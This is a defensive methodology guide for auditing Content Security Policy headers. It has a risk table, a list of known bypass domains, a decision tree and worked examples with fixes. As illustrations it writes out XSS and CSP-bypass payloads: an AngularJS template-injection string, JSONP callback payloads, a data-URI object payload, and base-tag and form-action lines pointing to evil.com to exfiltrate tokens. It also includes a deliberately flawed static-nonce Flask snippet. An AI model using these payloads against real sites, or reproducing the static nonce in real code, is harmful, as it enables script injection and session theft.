# Content Security Policy (CSP) Analysis

## Methodology

### Step 1: Locate and Parse All CSP Directives

CSP can be delivered via HTTP headers or HTML meta tags. When multiple policies exist,
they are intersected (most restrictive combination applies).

```
# HTTP header (primary)
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

# Meta tag (limited — cannot set frame-ancestors or report-uri)
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">

# Report-Only (does NOT enforce — monitoring only)
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

`default-src` is the fallback for any unspecified directive. If `script-src` is absent,
`default-src` governs script loading.

### Step 2: Evaluate Unsafe Directive Values

| Value             | Risk     | Effect                                               |
|-------------------|----------|------------------------------------------------------|
| `'unsafe-inline'` | Critical | Allows inline `<script>`, `<style>`, event handlers  |
| `'unsafe-eval'`   | High     | Allows `eval()`, `Function()`, `setTimeout(string)`  |
| `data:`           | High     | `<script src="data:text/javascript,alert(1)">`       |
| `blob:`           | Medium   | Blob URIs can create executable scripts              |
| `*`               | Critical | Any origin                                           |
| `https:`          | High     | Any HTTPS origin, including attacker-controlled      |

```
script-src 'self' 'unsafe-inline'   # VULNERABLE — negates XSS protection
script-src 'self' 'unsafe-eval'     # VULNERABLE — string-to-code execution
script-src 'self' data:             # VULNERABLE — data URI script injection
```

### Step 3: Analyze Source List for Overly Permissive Origins

Even without `unsafe-inline`, permissive source lists enable bypass via allowed origins:

```
# VULNERABLE — CDN bypass
Content-Security-Policy: script-src 'self' https://cdn.googleapis.com
# Attack: load AngularJS from CDN, use template injection to execute JS
```

Known bypass domains:

| Allowed Origin           | Bypass Vector                                    |
|--------------------------|--------------------------------------------------|
| `*.googleapis.com`       | JSONP callbacks, Angular libraries               |
| `*.cloudflare.com`      | cdnjs hosts attacker-usable libraries            |
| `*.amazonaws.com`       | S3 buckets with attacker-controlled JS           |
| `*.cloudfront.net`      | Attacker creates own CloudFront distribution     |
| `*.azurewebsites.net`   | Attacker deploys functions with JS               |
| `*.herokuapp.com`       | Attacker deploys apps serving malicious JS       |
| `accounts.google.com`   | JSONP endpoint on /o/oauth2/revoke               |

### Step 4: Check for Missing Critical Directives

Missing directives fall back to `default-src`. If `default-src` is also absent, they
default to `*`.

```
# Missing object-src — plugin-based XSS
script-src 'self'  # No default-src, so object-src defaults to *
# Attack: <object data="data:text/html,<script>alert(1)</script>">

# Missing base-uri — <base> tag hijacking
script-src 'self'
# Attack: <base href="https://evil.com/"> — relative script paths load from evil.com

# Missing form-action — form exfiltration
default-src 'self'
# Attack: <form action="https://evil.com/steal"> — exfiltrates CSRF tokens
```

Critical directives: `script-src`, `object-src` ('none'), `base-uri` ('self'/'none'),
`form-action` (restrict targets), `frame-ancestors` (see clickjacking skill).

### Step 5: Evaluate Nonce and Hash Implementations

Nonces/hashes allow specific inline scripts while blocking others. Check for flaws:

```
# STRONG — random nonce per request
Content-Security-Policy: script-src 'nonce-{cryptoRandom}'
<script nonce="{cryptoRandom}">/* allowed */</script>

# VULNERABLE — static/predictable nonce
script-src 'nonce-static-value-never-changes'
# Attacker knows nonce, injects: <script nonce="static-value-never-changes">

# VULNERABLE — nonce with unsafe-inline (CSP1 fallback)
script-src 'nonce-abc123' 'unsafe-inline'
# CSP2+ ignores unsafe-inline when nonce present, but CSP1 browsers use unsafe-inline
```

```
# Hash-based CSP (strong for static inline scripts)
script-src 'sha256-base64EncodedHash'
# Any script content change (even whitespace) invalidates the hash
```

### Step 6: Distinguish Report-Only from Enforcing

`Content-Security-Policy-Report-Only` logs violations but does NOT block them. Common
misconfiguration: deploying only report-only in production, believing it provides security.

```
Content-Security-Policy-Report-Only: default-src 'self'  # NOT enforced
Content-Security-Policy: default-src 'self'               # Enforced
```

### Step 7: Identify JSONP and Callback Endpoint Bypasses

If `script-src` allows an origin hosting JSONP endpoints, attacker executes arbitrary JS:

```
# CSP allows API domain with JSONP
script-src 'self' https://api.example.com
# GET /api/data?callback=alert(document.cookie) returns: alert(document.cookie)({...})
# Attack: <script src="https://api.example.com/api/data?callback=alert(1)//"></script>
```

Check allowed origins for: JSONP endpoints, file upload endpoints serving JS content-type,
AngularJS libraries enabling template injection, open redirects chaining to attacker hosts.

### Step 8: Evaluate Strict-Dynamic and Trusted Types

```
# strict-dynamic — trusts scripts loaded by already-trusted scripts
script-src 'nonce-random' 'strict-dynamic'
# Source list ignored in CSP3; CSP2 browsers fall back to source list

# Trusted Types — prevents DOM XSS by requiring typed objects
require-trusted-types-for 'script'
# innerHTML, document.write reject raw strings; must use TrustedTypes API
```

## Decision Tree

```
CSP header present?
|
+-- NO --> VULNERABLE (High)
+-- Report-Only ONLY --> VULNERABLE (High)
+-- YES (enforcing)
    |
    script-src/default-src contains 'unsafe-inline' (no nonce/hash override)?
    +-- YES --> VULNERABLE (Critical)
    +-- NO
        |
        Contains 'unsafe-eval'?
        +-- YES --> VULNERABLE (High)
        +-- NO
            |
            Broad wildcards (*, https:, data:)?
            +-- YES --> VULNERABLE (High)
            +-- NO
                |
                CDN domains with known bypasses?
                +-- YES --> VULNERABLE (High)
                +-- NO
                    |
                    object-src and base-uri restricted?
                    +-- NO --> HARDENED (Medium)
                    +-- YES
                        |
                        Nonce is cryptographically random per-request?
                        +-- YES --> SAFE
                        +-- Static/predictable --> VULNERABLE (High)
                        |
                        Strict source list, no known bypasses?
                        +-- YES --> SAFE
                        +-- NO --> HARDENED (Medium)
```

## Real-World Examples

### Example 1: CSP Bypass via Google CDN JSONP

```
Content-Security-Policy: script-src 'self' https://accounts.google.com https://cdn.googleapis.com
```

**Why vulnerable:** `accounts.google.com` has a JSONP endpoint at
`/o/oauth2/revoke?callback=PAYLOAD`. `cdn.googleapis.com` hosts AngularJS, enabling CSP
bypass via `ng-app` + template injection:
`{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}`. Any HTML injection
on the page allows loading Angular from the allowed CDN and executing arbitrary scripts.

**Impact:** Complete CSP bypass leading to XSS. Session token theft, user impersonation.
Classification: VULNERABLE (High).

**Fix:** Use nonce-based CSP with `strict-dynamic`, remove broad CDN allowances:
`script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'self'`

### Example 2: Missing object-src Allows Plugin-Based XSS

```
Content-Security-Policy: script-src 'self'; style-src 'self' 'unsafe-inline'
# No default-src, no object-src — object-src defaults to *
```

**Why vulnerable:** Attacker with HTML injection uses
`<object data="data:text/html,<script>alert(document.cookie)</script>">` to execute JS
via plugin context, bypassing the `script-src 'self'` restriction entirely.

**Impact:** XSS despite seemingly strict script-src. Full session compromise. Classification:
VULNERABLE (High).

**Fix:** Add `default-src 'self'; object-src 'none'; base-uri 'self'` as catch-all.

### Example 3: Static Nonce in Server-Side Template

```python
CSP_NONCE = "a1b2c3d4e5f6"  # Hardcoded constant

@app.after_request
def add_csp(response):
    response.headers["Content-Security-Policy"] = f"script-src 'nonce-{CSP_NONCE}'"
    return response
```

**Why vulnerable:** Nonce is a hardcoded constant identical across all requests and users.
Attacker observes one response (or reads open-source code) and knows the nonce permanently.
Any XSS injection includes `<script nonce="a1b2c3d4e5f6">` to bypass CSP.

**Impact:** Nonce-based CSP provides zero protection. Equivalent to no CSP for scripts.
Classification: VULNERABLE (Critical).

**Fix:** Generate cryptographically random nonce per request:
```python
import secrets
@app.before_request
def gen_nonce(): g.csp_nonce = secrets.token_urlsafe(32)
```

## Common False Positive Patterns

1. **Report-Only alongside enforcing policy.** If both headers present, the enforcing one
   provides protection. Only flag if enforcing header is absent or weaker.

2. **unsafe-inline in style-src only.** CSS injection has significantly lower impact than
   script injection (data exfiltration via selectors, not code execution). HARDENED (Medium).

3. **Intentional unsafe-eval.** IDEs, code playgrounds, dev tools legitimately need eval.
   Flag as HARDENED (Medium) with business justification note.

4. **CSP on API-only endpoints.** `Content-Type: application/json` responses are not
   rendered as HTML. Missing CSP on JSON endpoints is not a vulnerability.

5. **Nonce with unsafe-inline for backward compat.** CSP2+ ignores `unsafe-inline` when
   nonce present. Only very old CSP1 browsers fall back. Intentional pattern, HARDENED (Low).

6. **Strict-dynamic with source list.** `strict-dynamic` causes CSP3 browsers to ignore
   explicit source lists. The list exists for CSP2 fallback. Do not flag as permissive.

7. **Missing CSP on fully static pages.** Pages with no user input and no dynamic content
   have minimal XSS risk. HARDENED (Low) at most.
